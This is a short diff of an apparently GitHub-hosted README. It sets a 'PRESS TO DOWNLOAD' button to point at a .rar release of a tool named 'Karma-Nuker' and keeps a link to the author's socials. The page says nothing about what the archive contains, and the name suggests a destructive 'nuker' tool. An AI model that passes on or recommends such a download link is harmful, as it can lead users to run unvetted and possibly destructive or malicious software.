@@ -4,7 +4,7 @@
 </h3>
 
 <p align="center">
-<a href="">PRESS TO DOWNLOAD</a>
+<a href="https://github.com/dtbSSL/Karma-Nuker/releases/download/Karma-Nuker/Karma-Nuker.rar">PRESS TO DOWNLOAD</a>
 <p align="center">
 <a href="https://guns.lol/ssl">MY SOCIALS</a>
 </p>
